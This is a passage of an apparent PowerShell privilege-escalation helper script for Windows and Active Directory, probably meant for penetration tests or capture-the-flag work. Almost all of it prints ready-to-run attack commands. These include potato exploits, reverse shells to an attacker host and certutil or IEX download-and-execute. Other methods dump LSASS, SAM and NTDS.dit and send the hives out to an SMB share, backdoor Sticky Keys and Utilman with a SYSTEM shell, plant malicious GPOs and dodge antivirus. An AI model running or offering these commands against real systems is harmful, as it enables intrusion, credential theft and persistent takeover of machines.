            -Notes @('Cannot modify protected groups', 'But can add to RDP/WinRM')
        
        Write-Method -Number "2" -Title "Reset user password" `
            -Attacker @() `
            -Victim @(
                '# Reset password of non-protected user:',
                'net user targetuser NewPassword123! /domain',
                '',
                '# List all users:',
                'net user /domain'
            ) `
            -Notes @('Cannot reset admin passwords', 'Can reset regular users')
        
        Write-Method -Number "3" -Title "Abuse GenericAll on users" `
            -Attacker @() `
            -Victim @(
                '# Find users you have GenericAll on via BloodHound',
                '# Then set SPN for Kerberoasting:',
                'setspn -a HTTP/evil.domain.com targetuser'
            ) `
            -Notes @('Check BloodHound for permissions', 'May have more access than expected')
    }
    
    # =========================================================================
    # REMOTE DESKTOP USERS
    # =========================================================================
    if ($gn -match "remote.*desktop") {
        Write-SubSection "REMOTE DESKTOP USERS - ALL METHODS"
        
        Write-Method -Number "1" -Title "RDP with xfreerdp" `
            -Attacker @(
                'xfreerdp /v:TARGET_IP /u:YOURUSER /p:PASSWORD /cert:ignore'
            ) `
            -Victim @() `
            -Notes @('GUI access', 'Can run GUI tools')
        
        Write-Method -Number "2" -Title "RDP with rdesktop" `
            -Attacker @(
                'rdesktop -u YOURUSER -p PASSWORD TARGET_IP'
            ) `
            -Victim @() `
            -Notes @('Alternative RDP client')
        
        Write-Method -Number "3" -Title "RDP with credentials in command" `
            -Attacker @(
                'xfreerdp /v:TARGET_IP /u:DOMAIN\\YOURUSER /p:PASSWORD /cert:ignore /drive:share,/tmp'
            ) `
            -Victim @() `
            -Notes @('Mounts local /tmp as share', 'Easy file transfer')
        
        Write-Method -Number "4" -Title "RDP session hijacking (if SYSTEM)" `
            -Attacker @() `
            -Victim @(
                '# List sessions:',
                'query user',
                '',
                '# Hijack session (need SYSTEM):',
                'tscon SESSION_ID /dest:console'
            ) `
            -Notes @('Requires SYSTEM', 'Hijack other user sessions')
    }
    
    # =========================================================================
    # REMOTE MANAGEMENT USERS
    # =========================================================================
    if ($gn -match "remote.*management") {
        Write-SubSection "REMOTE MANAGEMENT USERS - ALL METHODS"
        
        Write-Method -Number "1" -Title "Evil-WinRM" `
            -Attacker @(
                'evil-winrm -i TARGET_IP -u YOURUSER -p PASSWORD'
            ) `
            -Victim @() `
            -Notes @('Best WinRM shell', 'Has upload/download built-in')
        
        Write-Method -Number "2" -Title "PowerShell Enter-PSSession" `
            -Attacker @(
                '$cred = Get-Credential',
                'Enter-PSSession -ComputerName TARGET_IP -Credential $cred'
            ) `
            -Victim @() `
            -Notes @('Native PowerShell', 'Interactive session')
        
        Write-Method -Number "3" -Title "PowerShell Invoke-Command" `
            -Attacker @(
                '$cred = Get-Credential',
                'Invoke-Command -ComputerName TARGET_IP -Credential $cred -ScriptBlock { whoami }'
            ) `
            -Victim @() `
            -Notes @('Run commands remotely', 'Non-interactive')
        
        Write-Method -Number "4" -Title "WinRM with crackmapexec" `
            -Attacker @(
                'crackmapexec winrm TARGET_IP -u YOURUSER -p PASSWORD -x "whoami"'
            ) `
            -Victim @() `
            -Notes @('Quick command execution', 'Good for spraying')
    }
    
    # =========================================================================
    # GROUP POLICY CREATOR OWNERS
    # =========================================================================
    if ($gn -match "group.*policy.*creator") {
        Write-SubSection "GROUP POLICY CREATOR OWNERS - ALL METHODS"
        
        Write-Method -Number "1" -Title "Create malicious GPO" `
            -Attacker @() `
            -Victim @(
                '# Create GPO:',
                'New-GPO -Name "EvilGPO"',
                '',
                '# Link to OU:',
                'New-GPLink -Name "EvilGPO" -Target "OU=Workstations,DC=domain,DC=com"',
                '',
                '# Add scheduled task via GPO:',
                '# Use GPMC GUI or Set-GPRegistryValue'
            ) `
            -Notes @('Can create but may need to link', 'Check linking permissions')
        
        Write-Method -Number "2" -Title "SharpGPOAbuse" `
            -Attacker @(
                'python3 -m http.server WEBPORT'
            ) `
            -Victim @(
                'certutil -urlcache -f http://YOURIP:WEBPORT/SharpGPOAbuse.exe WORKDIR\sgpo.exe',
                '',
                '# Add local admin:',
                'WORKDIR\sgpo.exe --AddLocalAdmin --UserAccount YOURUSER --GPOName "EvilGPO"',
                '',
                '# Add startup script:',
                'WORKDIR\sgpo.exe --AddComputerScript --ScriptName evil.bat --ScriptContents "net user hacker Password123! /add" --GPOName "EvilGPO"'
            ) `
            -Notes @('Automated GPO abuse', 'Many options available')
    }
}

# ============================================================================
# PRIVILEGE ENUMERATION
# ============================================================================

function Get-PrivilegeInfo {
    Write-Section "TOKEN PRIVILEGE ANALYSIS"
    
    Write-Host "[*] Enumerating ALL privileges..." -ForegroundColor Gray
    Write-Host "[!] DISABLED privileges can often STILL be exploited!" -ForegroundColor Yellow
    Write-Host ""
    
    $output = whoami /priv 2>$null
    if (-not $output) {
        Write-Host "[-] Could not enumerate privileges" -ForegroundColor Red
        return
    }
    
    Write-Host "ALL PRIVILEGES:" -ForegroundColor Cyan
    Write-Host ("-" * 50) -ForegroundColor Cyan
    
    $exploitable = @()
    
    foreach ($line in $output) {
        if ($line -match '(Se\w+Privilege)') {
            $privName = $matches[1]
            $status = if ($line -match 'Enabled') { "Enabled" } else { "Disabled" }
            
            $privInfo = $Script:DangerousPrivileges[$privName]
            
            if ($privInfo) {
                $canExploit = ($status -eq "Enabled") -or ($privInfo.CanExploitDisabled -eq $true)
                
                if ($canExploit -and $privInfo.Severity -match "CRITICAL|HIGH|MEDIUM") {
                    $note = ""
                    if ($status -eq "Disabled" -and $privInfo.CanExploitDisabled) {
                        $note = " <-- EXPLOITABLE WHEN DISABLED!"
                    }
                    
                    $color = switch ($privInfo.Severity) {
                        "CRITICAL" { "Magenta" }
                        "HIGH" { "Red" }
                        "MEDIUM" { "Yellow" }
                        default { "White" }
                    }
                    
                    Write-Host "  [!!!] $privName [$status]$note" -ForegroundColor $color
                    $exploitable += @{ Name = $privName; Status = $status; Info = $privInfo }
                } else {
                    Write-Host "  [*] $privName [$status]" -ForegroundColor Gray
                }
            } else {
                Write-Host "  [*] $privName [$status]" -ForegroundColor Gray
            }
        }
    }
    
    if ($exploitable.Count -gt 0) {
        Write-Section "EXPLOITABLE PRIVILEGES - ALL METHODS"
        
        foreach ($p in $exploitable) {
            $statusNote = $p.Status
            if ($p.Status -eq "Disabled" -and $p.Info.CanExploitDisabled) {
                $statusNote = "Disabled (but EXPLOITABLE!)"
            }
            
            Write-Finding -Cat "PRIVILEGE" -Name $p.Name -Sev $p.Info.Severity `
                -Status $statusNote -Details $p.Info.Description
            
            Show-AllPrivilegeExploits -PrivName $p.Name
        }
    }
}

# ============================================================================
# ALL PRIVILEGE EXPLOITATION METHODS
# ============================================================================

function Show-AllPrivilegeExploits {
    param([string]$PrivName)
    
    switch ($PrivName) {
        
        # =====================================================================
        # SeImpersonatePrivilege - ALL METHODS
        # =====================================================================
        "SeImpersonatePrivilege" {
            Write-SubSection "SeImpersonatePrivilege - ALL POTATO ATTACKS"
            
            Write-Method -Number "1" -Title "PrintSpoofer (Windows 10/Server 2016+)" `
                -Attacker @(
                    'wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe',
                    'python3 -m http.server WEBPORT',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/PrintSpoofer64.exe WORKDIR\ps.exe',
                    '',
                    '# Interactive SYSTEM shell:',
                    'WORKDIR\ps.exe -i -c cmd',
                    '',
                    '# Execute command:',
                    'WORKDIR\ps.exe -c "whoami"',
                    '',
                    '# Reverse shell:',
                    'WORKDIR\ps.exe -c "WORKDIR\nc.exe YOURIP YOURPORT -e cmd"',
                    '',
                    '# Add to administrators:',
                    'WORKDIR\ps.exe -c "net localgroup administrators YOURUSER /add"'
                ) `
                -Notes @('Works on Server 2016/2019/2022', 'Needs Print Spooler running')
            
            Write-Method -Number "2" -Title "GodPotato (ALL Windows versions)" `
                -Attacker @(
                    'wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/GodPotato-NET4.exe WORKDIR\gp.exe',
                    '',
                    '# Run command as SYSTEM:',
                    'WORKDIR\gp.exe -cmd "cmd /c whoami"',
                    '',
                    '# Add admin:',
                    'WORKDIR\gp.exe -cmd "net localgroup administrators YOURUSER /add"',
                    '',
                    '# Reverse shell:',
                    'WORKDIR\gp.exe -cmd "WORKDIR\nc.exe YOURIP YOURPORT -e cmd"'
                ) `
                -Notes @('Works on ALL Windows versions', 'Most universal potato')
            
            Write-Method -Number "3" -Title "JuicyPotatoNG (Windows 10/Server 2019)" `
                -Attacker @(
                    'wget https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/JuicyPotatoNG.exe WORKDIR\jp.exe',
                    '',
                    'WORKDIR\jp.exe -t * -p cmd.exe -a "/c whoami"',
                    'WORKDIR\jp.exe -t * -p cmd.exe -a "/c net localgroup administrators YOURUSER /add"'
                ) `
                -Notes @('Updated JuicyPotato', 'Works on Server 2019')
            
            Write-Method -Number "4" -Title "RoguePotato (Windows 10/Server 2019)" `
                -Attacker @(
                    'wget https://github.com/antonioCoco/RoguePotato/releases',
                    '# Run socat redirector:',
                    'socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/RoguePotato.exe WORKDIR\rp.exe',
                    '',
                    'WORKDIR\rp.exe -r YOURIP -e "cmd.exe /c whoami" -l 9999'
                ) `
                -Notes @('Needs port 135 redirection from attacker', 'Alternative to JuicyPotato')
            
            Write-Method -Number "5" -Title "SweetPotato (Windows 7-10, Server 2008-2019)" `
                -Attacker @(
                    'wget https://github.com/CCob/SweetPotato/releases',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/SweetPotato.exe WORKDIR\sp.exe',
                    '',
                    'WORKDIR\sp.exe -p cmd.exe -a "/c whoami"'
                ) `
                -Notes @('Multiple methods combined', 'Good fallback')
            
            Write-Method -Number "6" -Title "Original JuicyPotato (Windows 7-10, Server 2008-2016)" `
                -Attacker @(
                    'wget https://github.com/ohpe/juicy-potato/releases',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/JuicyPotato.exe WORKDIR\jp.exe',
                    '',
                    '# Need CLSID - get from: https://ohpe.it/juicy-potato/CLSID/',
                    'WORKDIR\jp.exe -l 1337 -p cmd.exe -a "/c whoami" -t * -c {CLSID}'
                ) `
                -Notes @('Original potato', 'Does NOT work on Server 2019+')
            
            Write-Method -Number "7" -Title "Hot Potato / Tater" `
                -Attacker @(
                    '# Only works on old unpatched systems'
                ) `
                -Victim @(
                    '# PowerShell:',
                    'IEX(New-Object Net.WebClient).DownloadString("http://YOURIP:WEBPORT/Tater.ps1")',
                    'Invoke-Tater -Trigger 1 -Command "net localgroup administrators YOURUSER /add"'
                ) `
                -Notes @('Only on unpatched systems', 'Uses NBNS/WPAD')
            
            Write-Method -Number "8" -Title "SharpEfsPotato" `
                -Attacker @(
                    'wget https://github.com/bugch3ck/SharpEfsPotato',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/SharpEfsPotato.exe WORKDIR\sep.exe',
                    '',
                    'WORKDIR\sep.exe -p cmd.exe -a "/c whoami"'
                ) `
                -Notes @('Uses EFS RPC', 'Alternative method')
        }
        
        "SeAssignPrimaryTokenPrivilege" {
            Write-Host ""
            Write-Host "  [INFO] Same attacks as SeImpersonatePrivilege work here!" -ForegroundColor Cyan
            Show-AllPrivilegeExploits -PrivName "SeImpersonatePrivilege"
        }
        
        # =====================================================================
        # SeBackupPrivilege - ALL METHODS
        # =====================================================================
        "SeBackupPrivilege" {
            Write-SubSection "SeBackupPrivilege - ALL METHODS"
            
            Write-Host ""
            Write-Host "  [INFO] Can READ any file on the system!" -ForegroundColor Cyan
            Write-Host "  [INFO] Files may be locked - use shadow copies!" -ForegroundColor Cyan
            
            Write-Method -Number "1" -Title "reg save (elevated CMD required)" `
                -Attacker @(
                    'impacket-smbserver share . -smb2support',
                    'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
                ) `
                -Victim @(
                    '# From elevated CMD (not PowerShell):',
                    'reg save HKLM\SAM WORKDIR\SAM',
                    'reg save HKLM\SYSTEM WORKDIR\SYSTEM',
                    'reg save HKLM\SECURITY WORKDIR\SECURITY',
                    '',
                    'copy WORKDIR\SAM \\YOURIP\share\',
                    'copy WORKDIR\SYSTEM \\YOURIP\share\'
                ) `
                -Notes @('Must run from elevated CMD', 'May fail if locked')
            
            Write-Method -Number "2" -Title "robocopy /b (backup semantics)" `
                -Attacker @(
                    'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
                ) `
                -Victim @(
                    'robocopy /b C:\Windows\System32\config WORKDIR SAM SYSTEM SECURITY'
                ) `
                -Notes @('Uses backup flag', 'Bypasses ACLs')
            
            Write-Method -Number "3" -Title "Shadow Copy (BEST FOR LOCKED FILES)" `
                -Attacker @(
                    'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
                ) `
                -Victim @(
                    '# Create shadow:',
                    'wmic shadowcopy call create Volume=C:\',
                    '',
                    '# List shadows:',
                    'vssadmin list shadows',
                    '',
                    '# Copy from shadow (use correct ID):',
                    'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM WORKDIR\',
                    'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM WORKDIR\',
                    'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY WORKDIR\'
                ) `
                -Notes @('Works on locked files!', 'Most reliable method')
            
            Write-Method -Number "4" -Title "diskshadow scripted" `
                -Attacker @(
                    'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
                ) `
                -Victim @(
                    '# Create script:',
                    'echo set context persistent nowriters > WORKDIR\shadow.txt',
                    'echo add volume c: alias myDrive >> WORKDIR\shadow.txt',
                    'echo create >> WORKDIR\shadow.txt',
                    'echo expose %myDrive% z: >> WORKDIR\shadow.txt',
                    '',
                    'diskshadow /s WORKDIR\shadow.txt',
                    '',
                    'robocopy /b z:\Windows\System32\config WORKDIR SAM SYSTEM'
                ) `
                -Notes @('Exposes shadow as drive', 'Good for scripting')
            
            Write-Method -Number "5" -Title "wbadmin backup" `
                -Attacker @(
                    'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
                ) `
                -Victim @(
                    'wbadmin start backup -backuptarget:\\YOURIP\share -include:C:\Windows\System32\config -quiet'
                ) `
                -Notes @('Windows Backup', 'Sends to SMB share')
            
            Write-Method -Number "6" -Title "NTDS.dit - Shadow Copy (DC)" `
                -Attacker @(
                    'impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL'
                ) `
                -Victim @(
                    'wmic shadowcopy call create Volume=C:\',
                    'vssadmin list shadows',
                    '',
                    'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit WORKDIR\',
                    'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM WORKDIR\'
                ) `
                -Notes @('Domain Controller only', 'Contains ALL domain hashes')
            
            Write-Method -Number "7" -Title "NTDS.dit - ntdsutil (DC)" `
                -Attacker @(
                    'impacket-secretsdump -ntds Active\ Directory/ntds.dit -system registry/SYSTEM LOCAL'
                ) `
                -Victim @(
                    'ntdsutil "ac i ntds" "ifm" "create full WORKDIR\ntds" q q',
                    '',
                    '# Files in WORKDIR\ntds\Active Directory\ and WORKDIR\ntds\registry\'
                ) `
                -Notes @('Creates IFM backup', 'Includes NTDS.dit and registry')
            
            Write-Method -Number "8" -Title "Read ANY file (robocopy /b)" `
                -Attacker @() `
                -Victim @(
                    '# Read root.txt:',
                    'robocopy /b C:\Users\Administrator\Desktop WORKDIR root.txt',
                    'type WORKDIR\root.txt',
                    '',
                    '# Read any sensitive file:',
                    'robocopy /b C:\Users\TARGET\Documents WORKDIR passwords.txt'
                ) `
                -Notes @('Can read any file', 'Use for flags, configs, etc.')
            
            Write-Method -Number "9" -Title "BackupOperatorToDA tool" `
                -Attacker @(
                    'git clone https://github.com/mpgn/BackupOperatorToDA',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/BackupOperatorToDA.exe WORKDIR\bo.exe',
                    '',
                    'WORKDIR\bo.exe -t \\DC01 -u YOURUSER -p PASSWORD -d DOMAIN -o WORKDIR\'
                ) `
                -Notes @('Automated NTDS.dit extraction', 'Targets DC remotely')
        }
        
        # =====================================================================
        # SeRestorePrivilege - ALL METHODS
        # =====================================================================
        "SeRestorePrivilege" {
            Write-SubSection "SeRestorePrivilege - ALL METHODS"
            
            Write-Host ""
            Write-Host "  [INFO] Can WRITE any file on the system!" -ForegroundColor Cyan
            
            Write-Method -Number "1" -Title "Replace utilman.exe (Win+U at login)" `
                -Attacker @(
                    'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe -o evil.exe',
                    'python3 -m http.server WEBPORT',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/evil.exe WORKDIR\evil.exe',
                    '',
                    '# Backup and replace:',
                    'robocopy /b C:\Windows\System32 WORKDIR Utilman.exe',
                    'robocopy /b WORKDIR C:\Windows\System32 evil.exe',
                    'ren C:\Windows\System32\Utilman.exe Utilman.bak',
                    'ren C:\Windows\System32\evil.exe Utilman.exe',
                    '',
                    '# Trigger: Lock screen (Win+L), press Win+U'
                ) `
                -Notes @('SYSTEM shell at login', 'Press Win+U to trigger')
            
            Write-Method -Number "2" -Title "Replace sethc.exe (Sticky Keys - 5x Shift)" `
                -Attacker @(
                    'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe -o evil.exe',
                    'python3 -m http.server WEBPORT',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/evil.exe WORKDIR\evil.exe',
                    '',
                    'robocopy /b WORKDIR C:\Windows\System32 evil.exe',
                    'ren C:\Windows\System32\sethc.exe sethc.bak',
                    'ren C:\Windows\System32\evil.exe sethc.exe',
                    '',
                    '# Trigger: Lock screen, press Shift 5 times'
                ) `
                -Notes @('SYSTEM shell at login', 'Press Shift 5 times')
            
            Write-Method -Number "3" -Title "Replace Narrator.exe (Win+Ctrl+Enter)" `
                -Attacker @(
                    'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe -o evil.exe',
                    'python3 -m http.server WEBPORT',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/evil.exe WORKDIR\evil.exe',
                    '',
                    'robocopy /b WORKDIR C:\Windows\System32 evil.exe',
                    'ren C:\Windows\System32\Narrator.exe Narrator.bak',
                    'ren C:\Windows\System32\evil.exe Narrator.exe',
                    '',
                    '# Trigger: Win+Ctrl+Enter at login'
                ) `
                -Notes @('Another accessibility feature', 'Win+Ctrl+Enter')
            
            Write-Method -Number "4" -Title "Replace osk.exe (On-Screen Keyboard)" `
                -Attacker @(
                    'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe -o evil.exe',
                    'python3 -m http.server WEBPORT',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/evil.exe WORKDIR\evil.exe',
                    '',
                    'robocopy /b WORKDIR C:\Windows\System32 evil.exe',
                    'ren C:\Windows\System32\osk.exe osk.bak',
                    'ren C:\Windows\System32\evil.exe osk.exe',
                    '',
                    '# Trigger: Click On-Screen Keyboard at login'
                ) `
                -Notes @('On-Screen Keyboard', 'Click keyboard icon')
            
            Write-Method -Number "5" -Title "Replace Magnify.exe (Magnifier)" `
                -Attacker @(
                    'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe -o evil.exe',
                    'python3 -m http.server WEBPORT',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/evil.exe WORKDIR\evil.exe',
                    '',
                    'robocopy /b WORKDIR C:\Windows\System32 evil.exe',
                    'ren C:\Windows\System32\Magnify.exe Magnify.bak',
                    'ren C:\Windows\System32\evil.exe Magnify.exe',
                    '',
                    '# Trigger: Win++ or accessibility options'
                ) `
                -Notes @('Magnifier', 'Win++ or accessibility')
            
            Write-Method -Number "6" -Title "DLL Hijacking - wlbsctrl.dll (IKEEXT service)" `
                -Attacker @(
                    'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f dll -o wlbsctrl.dll',
                    'python3 -m http.server WEBPORT',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/wlbsctrl.dll WORKDIR\wlbsctrl.dll',
                    '',
                    'robocopy /b WORKDIR C:\Windows\System32 wlbsctrl.dll',
                    '',
                    '# Restart IKEEXT or reboot:',
                    'sc stop IKEEXT',
                    'sc start IKEEXT'
                ) `
                -Notes @('IKEEXT service DLL hijack', 'Classic privesc')
            
            Write-Method -Number "7" -Title "Replace service binary" `
                -Attacker @(
                    'msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=YOURPORT -f exe-service -o svc.exe',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    '# Find service path:',
                    'sc qc TargetService',
                    '',
                    'certutil -urlcache -f http://YOURIP:WEBPORT/svc.exe WORKDIR\svc.exe',
                    '',
                    '# Backup and replace:',
                    'robocopy /b "C:\Path\To" WORKDIR service.exe',
                    'robocopy /b WORKDIR "C:\Path\To" svc.exe',
                    'ren "C:\Path\To\service.exe" service.bak',
                    'ren "C:\Path\To\svc.exe" service.exe',
                    '',
                    'sc stop TargetService',
                    'sc start TargetService'
                ) `
                -Notes @('Replace any service binary', 'Check service paths')
            
            Write-Method -Number "8" -Title "Modify SAM directly (add admin user)" `
                -Attacker @() `
                -Victim @(
                    '# This is advanced - use offline SAM editor',
                    '# 1. Copy SAM and SYSTEM from shadow',
                    '# 2. Use chntpw or samdump2 to modify',
                    '# 3. Write modified SAM back',
                    '',
                    '# Easier: Replace SAM with one containing known password'
                ) `
                -Notes @('Advanced technique', 'Usually easier to replace binaries')
        }
        
        # =====================================================================
        # SeDebugPrivilege - ALL METHODS
        # =====================================================================
        "SeDebugPrivilege" {
            Write-SubSection "SeDebugPrivilege - ALL METHODS"
            
            Write-Method -Number "1" -Title "LSASS dump - comsvcs.dll (built-in)" `
                -Attacker @(
                    '# After getting dump:',
                    'pypykatz lsa minidump lsass.dmp',
                    '# OR:',
                    'mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit'
                ) `
                -Victim @(
                    '# Get LSASS PID:',
                    'tasklist /fi "imagename eq lsass.exe"',
                    '',
                    '# Dump (replace 1234 with actual PID):',
                    'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 1234 WORKDIR\lsass.dmp full'
                ) `
                -Notes @('Uses built-in comsvcs.dll', 'No external tools needed')
            
            Write-Method -Number "2" -Title "LSASS dump - procdump (Sysinternals)" `
                -Attacker @(
                    'wget https://live.sysinternals.com/procdump64.exe',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/procdump64.exe WORKDIR\pd.exe',
                    '',
                    'WORKDIR\pd.exe -accepteula -ma lsass.exe WORKDIR\lsass.dmp'
                ) `
                -Notes @('Signed Microsoft binary', 'May bypass AV')
            
            Write-Method -Number "3" -Title "LSASS dump - Task Manager (GUI)" `
                -Attacker @() `
                -Victim @(
                    '# Open Task Manager (Ctrl+Shift+Esc)',
                    '# Details tab -> Find lsass.exe',
                    '# Right-click -> Create dump file',
                    '# File saved to %TEMP%'
                ) `
                -Notes @('No command line needed', 'Works via RDP')
            
            Write-Method -Number "4" -Title "LSASS dump - Out-Minidump (PowerShell)" `
                -Attacker @(
                    'wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'IEX(New-Object Net.WebClient).DownloadString("http://YOURIP:WEBPORT/Out-Minidump.ps1")',
                    'Get-Process lsass | Out-Minidump -DumpFilePath WORKDIR'
                ) `
                -Notes @('PowerShell based', 'May trigger AV')
            
            Write-Method -Number "5" -Title "Mimikatz direct (in-memory)" `
                -Attacker @(
                    'wget https://github.com/gentilkiwi/mimikatz/releases',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/mimikatz.exe WORKDIR\m.exe',
                    '',
                    'WORKDIR\m.exe "privilege::debug" "sekurlsa::logonpasswords" exit'
                ) `
                -Notes @('Direct credential extraction', 'Will trigger AV')
            
            Write-Method -Number "6" -Title "Process injection into SYSTEM" `
                -Attacker @(
                    '# If using Meterpreter:'
                ) `
                -Victim @(
                    '# Find SYSTEM processes:',
                    'tasklist /v /fi "username eq NT AUTHORITY\SYSTEM"',
                    '',
                    '# Good targets: winlogon.exe, services.exe, lsass.exe',
                    '',
                    '# In Meterpreter:',
                    'ps',
                    'migrate PID_OF_SYSTEM_PROCESS'
                ) `
                -Notes @('Inject into SYSTEM process', 'Elevates current session')
            
            Write-Method -Number "7" -Title "PPLdump (Protected Process Light bypass)" `
                -Attacker @(
                    'git clone https://github.com/itm4n/PPLdump',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/PPLdump.exe WORKDIR\ppl.exe',
                    '',
                    'WORKDIR\ppl.exe lsass.exe WORKDIR\lsass.dmp'
                ) `
                -Notes @('Bypasses PPL protection', 'For newer Windows')
            
            Write-Method -Number "8" -Title "nanodump (AV evasion)" `
                -Attacker @(
                    'git clone https://github.com/helpsystems/nanodump',
                    '# Compile with BOF or standalone',
                    'python3 -m http.server WEBPORT'
                ) `
                -Victim @(
                    'certutil -urlcache -f http://YOURIP:WEBPORT/nanodump.exe WORKDIR\nd.exe',
                    '',
                    'WORKDIR\nd.exe -w WORKDIR\lsass.dmp'
                ) `
                -Notes @('Designed for AV evasion', 'Multiple dump methods')
        }
        
        # =====================================================================
        # SeTakeOwnershipPrivilege - ALL METHODS
        # =====================================================================
        "SeTakeOwnershipPrivilege" {
            Write-SubSection "SeTakeOwnershipPrivilege - ALL METHODS"
            
            Write-Host ""
            Write-Host "  [INFO] Can take ownership of ANY object!" -ForegroundColor Cyan
            Write-Host "  [INFO] Then grant yourself permissions to access/modify" -ForegroundColor Cyan
            Write-Host "  [WARN] SAM is LOCKED while running - use shadow copy!" -ForegroundColor Yellow
            
            Write-Method -Number "1" -Title "Own and read SAM via Shadow Copy (RECOMMENDED)" `
                -Attacker @(
                    'impacket-secretsdump -sam SAM -system SYSTEM LOCAL'
                ) `
                -Victim @(
                    '# SAM is locked while Windows runs!',
                    '# Use shadow copy instead:',
                    '',
                    '# Create shadow:',
                    'wmic shadowcopy call create Volume=C:\',
                    '',
                    '# List shadows:',
                    'vssadmin list shadows',
                    '',
                    '# Take ownership of shadow copy path (not needed for reading)',
                    '# Just copy from shadow:',
                    'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM WORKDIR\',
                    'copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM WORKDIR\'
                ) `
                -Notes @('SAM is locked while running', 'Shadow copy bypasses lock')
            
            Write-Method -Number "2" -Title "Own utilman.exe and replace" `
                -Attacker @(
                    'cp /usr/share/windows-binaries/nc.exe .',
                    '# OR copy cmd.exe to utilman.exe',
                    'nc -lvnp YOURPORT'
                ) `
                -Victim @(
                    '# Take ownership:',
                    'takeown /f C:\Windows\System32\Utilman.exe',
                    '',
                    '# Grant full control (use actual username, NOT %USERNAME% in PowerShell):',
                    'icacls C:\Windows\System32\Utilman.exe /grant YOURUSER:F',
                    '',
                    '# Replace with cmd.exe:',
                    'copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe',
                    '',
                    '# Trigger: Lock screen (Win+L), press Win+U'
                ) `
                -Notes @('Replace with cmd.exe', 'Gets SYSTEM shell at login')
            
            Write-Method -Number "3" -Title "Own sethc.exe and replace (Sticky Keys)" `
                -Attacker @() `
                -Victim @(
                    'takeown /f C:\Windows\System32\sethc.exe',
                    'icacls C:\Windows\System32\sethc.exe /grant YOURUSER:F',
                    'copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe',
                    '',
                    '# Trigger: Lock screen, press Shift 5 times'
                ) `
                -Notes @('Sticky Keys attack', 'Press Shift 5 times at login')
            
            Write-Method -Number "4" -Title "Own Narrator.exe and replace" `
                -Attacker @() `
                -Victim @(
                    'takeown /f C:\Windows\System32\Narrator.exe',
                    'icacls C:\Windows\System32\Narrator.exe /grant YOURUSER:F',
                    'copy C:\Windows\System32\cmd.exe C:\Windows\System32\Narrator.exe',
                    '',
                    '# Trigger: Win+Ctrl+Enter at login'
                ) `
                -Notes @('Narrator accessibility', 'Win+Ctrl+Enter at login')
            
            Write-Method -Number "5" -Title "Own service binary and replace" `
